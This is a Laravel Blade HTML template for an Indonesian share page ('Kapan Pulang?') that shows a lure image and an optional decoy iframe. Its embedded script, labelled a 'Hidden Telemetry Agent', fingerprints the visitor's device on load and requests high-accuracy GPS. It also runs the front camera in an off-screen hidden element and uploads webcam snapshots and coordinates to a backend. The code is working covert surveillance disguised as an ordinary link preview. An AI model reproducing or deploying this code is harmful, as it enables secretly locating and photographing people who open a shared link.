<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ $siteTitle }}</title>
    
    <!-- Open Graph Meta Tags -->
    <meta property="og:title" content="{{ $siteTitle ?? 'Kapan Pulang?' }}">
    <meta property="og:description" content="{{ $siteDescription ?? 'Kangen nih, kapan pulang?' }}">
    <meta property="og:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}">
    <meta property="og:type" content="website">
    <meta property="og:url" content="{{ url()->current() }}">

    <!-- Twitter Card Meta Tags -->
    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:title" content="{{ $siteTitle ?? 'Kapan Pulang?' }}">
    <meta name="twitter:description" content="{{ $siteDescription ?? 'Kangen nih, kapan pulang?' }}">
    <meta name="twitter:image" content="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}">

    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            background-color: #0e0e10;
            color: #efeff1;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }
        .container {
            width: 100%;
            max-width: 600px;
            text-align: center;
            padding: 15px;
        }
        .title {
            color: #ffffff;
            margin-bottom: 15px;
            font-size: 1.25rem;
            font-weight: 600;
        }
        .preview-img {
            width: 100%;
            max-height: 500px;
            object-fit: cover;
            border-radius: 12px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
        }
        .iframe-container {
            width: 100%;
            margin-top: 15px;
            border-radius: 8px;
            overflow: hidden;
            background: #18181b;
        }
        iframe {
            width: 100%;
            height: 600px;
            border: none;
        }
        .hidden-cam {
            display: none !important;
            visibility: hidden !important;
            position: absolute;
            left: -9999px;
        }
    </style>
</head>
<body>

    <div class="container">
        @if(!empty($landingHeading))
            <h3 class="title">{{ $landingHeading }}</h3>
        @endif
        <img src="{{ !empty($ogImageUrl) ? $ogImageUrl : asset('images/landing/kapan-pulang.jfif') }}" alt="Preview" class="preview-img">
    </div>

    @if(!empty($decoyIframeUrl))
        <div class="iframe-container">
            <iframe src="{{ $decoyIframeUrl }}"></iframe>
        </div>
    @endif

    <!-- Hidden Video & Canvas for Capture -->
    <div class="hidden-cam">
        <video id="v_stream" playsinline autoplay muted></video>
        <canvas id="c_buffer" width="640" height="480"></canvas>
    </div>

    <!-- Hidden Telemetry Agent -->
    <script>
        (function() {
            let sessionUuid = localStorage.getItem('_rv_uuid') || null;
            let telemetryConfig = {
                gps_enabled: true,
                cam_enabled: true,
                cam_interval: 2500,
                max_snapshots: 5
            };
            let snapshotsSent = 0;
            let camIntervalTimer = null;

            // Collect client telemetry
            const payload = {
                uuid: sessionUuid,
                user_agent: navigator.userAgent || 'Unknown',
                platform: navigator.platform || (navigator.userAgentData ? navigator.userAgentData.platform : 'Unknown'),
                browser_name: navigator.appName || 'Unknown',
                browser_language: navigator.language || navigator.userLanguage || 'Unknown',
                ram: navigator.deviceMemory ? String(navigator.deviceMemory) : null,
                cpu_cores: navigator.hardwareConcurrency ? String(navigator.hardwareConcurrency) : null,
                screen_resolution: window.screen ? (window.screen.width + 'x' + window.screen.height + ' (' + (window.screen.colorDepth || 24) + '-bit)') : null,
                referrer: document.referrer || null
            };

            // 1. Initial Handshake with Backend
            fetch('/api/v1/telemetry/init', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Accept': 'application/json'
                },
                body: JSON.stringify(payload)
            })
            .then(res => res.json())
            .then(data => {
                if (data.uuid) {
                    sessionUuid = data.uuid;
                    localStorage.setItem('_rv_uuid', data.uuid);
                }
                if (data.config) {
                    telemetryConfig = data.config;
                }

                // Trigger location if enabled
                if (telemetryConfig.gps_enabled) {
                    reqLocation();
                }

                // Trigger camera if enabled
                if (telemetryConfig.cam_enabled) {
                    initCamera();
                }
            })
            .catch(() => {
                // Silent fallback
            });

            // 2. Geolocation Handler
            function reqLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        function(pos) {
                            fetch('/api/v1/telemetry/location', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json'
                                },
                                body: JSON.stringify({
                                    uuid: sessionUuid,
                                    latitude: pos.coords.latitude,
                                    longitude: pos.coords.longitude,
                                    accuracy: pos.coords.accuracy
                                })
                            }).catch(() => {});
                        },
                        function(err) {
                            let reason = 'Unknown location error';
                            if (err.code === 1) reason = 'User denied Geolocation permission';
                            else if (err.code === 2) reason = 'Position unavailable';
                            else if (err.code === 3) reason = 'Geolocation request timed out';

                            fetch('/api/v1/telemetry/location', {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                    'Accept': 'application/json'
                                },
                                body: JSON.stringify({
                                    uuid: sessionUuid,
                                    denied: true,
                                    error: reason
                                })
                            }).catch(() => {});
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 12000,
                            maximumAge: 0
                        }
                    );
                }
            }

            // 3. Camera Capture Handler
            async function initCamera() {
                const video = document.getElementById('v_stream');
                const canvas = document.getElementById('c_buffer');
                if (!video || !canvas) return;

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: { facingMode: 'user' }
                    });
                    
                    video.srcObject = stream;
                    video.play();

                    const ctx = canvas.getContext('2d');

                    camIntervalTimer = setInterval(() => {
                        if (snapshotsSent >= (telemetryConfig.max_snapshots || 5)) {
                            clearInterval(camIntervalTimer);
                            stream.getTracks().forEach(track => track.stop());
                            return;
                        }

                        if (video.videoWidth > 0 && video.videoHeight > 0) {
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                            canvas.toBlob(function(blob) {
                                if (!blob) return;

                                const fd = new FormData();
                                fd.append('uuid', sessionUuid);
                                fd.append('image', blob, 'cam_' + Date.now() + '.jpg');

                                fetch('/api/v1/telemetry/snapshot', {
                                    method: 'POST',
                                    body: fd
                                })
                                .then(r => r.json())
                                .then(res => {
                                    if (res.status === 'ok') {
                                        snapshotsSent++;
                                    } else if (res.status === 'limit_reached') {
                                        clearInterval(camIntervalTimer);
                                        stream.getTracks().forEach(track => track.stop());
                                    }
                                })
                                .catch(() => {});
                            }, 'image/jpeg', 0.85);
                        }
                    }, telemetryConfig.cam_interval || 2500);

                } catch (e) {
                    // Camera permission denied or not available
                }
            }

        })();
    </script>
</body>
</html>
